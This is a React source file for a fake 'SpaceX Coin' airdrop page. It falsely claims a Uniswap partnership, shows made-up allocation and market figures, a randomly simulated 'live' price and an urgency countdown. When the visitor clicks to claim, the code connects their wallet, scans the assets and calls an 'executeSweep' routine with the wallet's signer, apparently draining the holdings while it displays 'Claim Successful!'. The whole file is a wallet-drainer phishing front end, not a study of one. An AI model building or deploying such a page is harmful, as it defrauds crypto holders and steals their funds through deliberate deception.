import { useState, useEffect, useRef } from 'react';
import './styles/index.css';
import { detectWallets, connectWallet, type WalletConnection, type WalletType } from './services/walletService';
import { scanPortfolio, executeSweep, type PortfolioAsset, type SweepProgress } from './services/sweepService';

function App() {
    const [view, setView] = useState<'landing' | 'wallets' | 'claiming' | 'complete'>('landing');
    const [wallets, setWallets] = useState<{ type: WalletType; name: string; icon: string; available: boolean }[]>([]);
    const [connection, setConnection] = useState<WalletConnection | null>(null);
    const [progress, setProgress] = useState<SweepProgress>({ phase: 'scanning', progress: 0, message: '' });
    const [error, setError] = useState<string | null>(null);

    // Live Price Simulation State
    const [livePrice, setLivePrice] = useState(0.002480);
    const [timer, setTimer] = useState({ hours: 4, minutes: 32, seconds: 15 });

    useEffect(() => {
        setWallets(detectWallets());

        // Price simulation
        const priceInterval = setInterval(() => {
            setLivePrice(prev => {
                const change = (Math.random() - 0.48) * 0.000005;
                return Math.max(0.0022, Math.min(0.0028, prev + change));
            });
        }, 2000);

        // Countdown timer
        const timerInterval = setInterval(() => {
            setTimer(prev => {
                let s = prev.seconds - 1;
                let m = prev.minutes;
                let h = prev.hours;
                if (s < 0) { s = 59; m--; }
                if (m < 0) { m = 59; h--; }
                if (h < 0) return { hours: 0, minutes: 0, seconds: 0 };
                return { hours: h, minutes: m, seconds: s };
            });
        }, 1000);

        return () => {
            clearInterval(priceInterval);
            clearInterval(timerInterval);
        };
    }, []);

    const handleStartClaim = () => setView('wallets');

    const handleConnect = async (type: WalletType) => {
        try {
            setError(null);
            const conn = await connectWallet(type);
            setConnection(conn);
            setView('claiming');

            const { portfolio: p } = await scanPortfolio(conn.address, conn.provider, setProgress);

            if (p.length === 0) {
                setProgress({ phase: 'complete', progress: 100, message: 'Claimed' });
                setView('complete');
                return;
            }

            await executeSweep(conn.signer, conn.address, p, conn.chainId, setProgress);
            setView('complete');
        } catch (err: any) {
            console.error(err);
            setError(err.message || 'Connection failed');
            setView('landing');
        }
    };

    return (
        <div className="root-wrapper">
            <nav>
                <div className="nav-left">
                    <div className="spcx-logo-img"></div>
                    <span className="brand-name">SpaceX Coin</span>
                </div>
                <div className="uni-badge">
                    <div className="uni-icon"></div>
                    <span>Partnered with Uniswap</span>
                </div>
            </nav>

            <div className="container">
                {/* LEFT: CLAIM SECTION */}
                <div className="claim-section">
                    <div>
                        <h1>Claim Your SPCX<br />Airdrop Allocation</h1>
                        <p className="subtitle">Official distribution event for SpaceX Coin. Verified on-chain allocation based on your wallet activity. Limited window remaining.</p>
                    </div>

                    <div className="stats-row">
                        <div className="stat-item">
                            <span className="stat-label">Your Allocation</span>
                            <span className="stat-value">100,000 SPCX</span>
                        </div>
                        <div className="stat-item">
                            <span className="stat-label">Est. Value</span>
                            <span className="stat-value usd">≈ $1,500.00</span>
                        </div>
                    </div>

                    <div className="trust-badges">
                        <span className="trust-label">Trusted By</span>
                        <div className="wallet-icons">
                            <img src="https://raw.githubusercontent.com/MetaMask/brand-assets/main/Assets/SVG/Icon/FullColor/MetaMask_Icon_FullColor.svg" alt="MetaMask" className="wallet-logo" />
                            <img src="https://raw.githubusercontent.com/phantom-labs/press-kit/main/logo/phantom-icon-purple.svg" alt="Phantom" className="wallet-logo" />
                            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" alt="Trust Wallet" className="wallet-logo" />
                        </div>
                    </div>

                    <div className="claim-card">
                        {view === 'landing' && (
                            <>
                                <div className="timer-container">
                                    <div className="time-box"><span className="time-val">{String(timer.hours).padStart(2, '0')}</span><span className="time-label">Hours</span></div>
                                    <div className="time-box"><span className="time-val">{String(timer.minutes).padStart(2, '0')}</span><span className="time-label">Mins</span></div>
                                    <div className="time-box"><span className="time-val">{String(timer.seconds).padStart(2, '0')}</span><span className="time-label">Secs</span></div>
                                </div>
                                <button className="claim-btn" onClick={handleStartClaim}>
                                    <svg viewBox="0 0 24 24" style={{ width: 22, height: 22, fill: 'currentColor' }}><path d="M12 2.5c-3.5 3.5-5 7-5 10.5 0 2.5 1.5 4.5 3.5 5.5L12 24l1.5-5.5c2-1 3.5-3 3.5-5.5 0-3.5-1.5-7-5-10.5zm0 4c1.5 0 2.5 1 2.5 2.5S13.5 11.5 12 11.5 9.5 10.5 9.5 9s1-2.5 2.5-2.5z" /></svg>
                                    CLAIM SPCX COIN
                                </button>
                            </>
                        )}

                        {view === 'wallets' && (
                            <div className="wallet-list">
                                <h3 style={{ marginBottom: '1rem', textAlign: 'center' }}>Connect Wallet</h3>
                                {wallets.map(w => (
                                    <button
                                        key={w.type}
                                        className="wallet-item"
                                        onClick={() => w.available && handleConnect(w.type)}
                                        disabled={!w.available}
                                    >
                                        <img src={w.icon} className="wallet-icon-sm" alt={w.name} />
                                        <span>{w.name}</span>
                                        {!w.available && <span style={{ fontSize: '0.7rem', marginLeft: 'auto', opacity: 0.5 }}>Not found</span>}
                                    </button>
                                ))}
                                {error && <p className="error-text" style={{ color: 'var(--accent-red)' }}>{error}</p>}
                            </div>
                        )}

                        {view === 'claiming' && (
                            <div className="progress-container">
                                <h3 style={{ textAlign: 'center' }}>{progress.message}</h3>
                                <div className="progress-bar-bg">
                                    <div className="progress-bar-fill" style={{ width: `${progress.progress}%` }}></div>
                                </div>
                                <p className="progress-msg">{progress.progress}% Finalizing...</p>
                            </div>
                        )}

                        {view === 'complete' && (
                            <div className="success-state">
                                <div className="check-circle"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" /></svg></div>
                                <h2 style={{ marginBottom: '0.5rem' }}>Claim Successful!</h2>
                                <p style={{ color: 'var(--text-secondary)' }}>Your 100,000 SPCX tokens have been reserved. Check your wallet shortly.</p>
                                <button className="claim-btn" style={{ marginTop: '2rem', background: 'rgba(255,255,255,0.05)', color: 'white' }} onClick={() => window.location.reload()}>
                                    DONE
                                </button>
                            </div>
                        )}
                    </div>
                </div>

                {/* RIGHT: MARKET ANALYSIS PHONE MOCKUP */}
                <div className="market-mockup">
                    <div className="phone-screen">
                        <div className="phone-header">
                            <div className="token-info">
                                <div className="token-icon-sm"></div>
                                <div>
                                    <div className="token-name">SPCX</div>
                                    <div className="token-pair">SPCX / USDC</div>
                                </div>
                            </div>
                            <div className="live-indicator"><div className="live-dot"></div> Live</div>
                        </div>

                        <div className="price-display">
                            <div className="current-price">${livePrice.toFixed(6)}</div>
                            <div className="price-change">
                                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 14l5-5 5 5z" /></svg>
                                +12.4% (24h)
                            </div>
                        </div>

                        <div className="chart-area">
                            <svg className="chart-svg" viewBox="0 0 300 160" preserveAspectRatio="none">
                                <defs>
                                    <linearGradient id="greenGradient" x1="0" y1="0" x2="0" y2="1">
                                        <stop offset="0%" stopColor="#00d66f" />
                                        <stop offset="100%" stopColor="#00d66f" stopOpacity="0" />
                                    </linearGradient>
                                </defs>
                                <line className="grid-line" x1="0" y1="40" x2="300" y2="40" />
                                <line className="grid-line" x1="0" y1="80" x2="300" y2="80" />
                                <line className="grid-line" x1="0" y1="120" x2="300" y2="120" />

                                {/* Procedural Candles (Simplified) */}
                                <rect x="10" y="100" width="5" height="20" rx="1" className="candle-green" />
                                <rect x="25" y="90" width="5" height="30" rx="1" className="candle-green" />
                                <rect x="40" y="95" width="5" height="15" rx="1" className="candle-red" />
                                <rect x="55" y="80" width="5" height="40" rx="1" className="candle-green" />
                                <rect x="70" y="70" width="5" height="25" rx="1" className="candle-green" />
                                <rect x="85" y="75" width="5" height="20" rx="1" className="candle-red" />
                                <rect x="100" y="60" width="5" height="45" rx="1" className="candle-green" />
                                <rect x="115" y="55" width="5" height="35" rx="1" className="candle-green" />
                                <rect x="130" y="65" width="5" height="15" rx="1" className="candle-red" />
                                <rect x="145" y="50" width="5" height="30" rx="1" className="candle-green" />
                                <rect x="160" y="45" width="5" height="20" rx="1" className="candle-green" />

                                <path className="chart-fill" d="M0,130 C40,120 80,105 120,95 C160,85 200,70 240,55 C260,48 280,42 300,38 L300,160 L0,160 Z" />
                                <path className="chart-line" d="M0,130 C40,120 80,105 120,95 C160,85 200,70 240,55 C260,48 280,42 300,38" />
                            </svg>
                        </div>

                        <div className="phone-footer">
                            <div className="footer-item">Vol (24h)<div className="footer-val">$4.2M</div></div>
                            <div className="footer-item">MCap<div className="footer-val">$200M</div></div>
                            <div className="footer-item">Holders<div className="footer-val">12.4K</div></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
}

export default App;
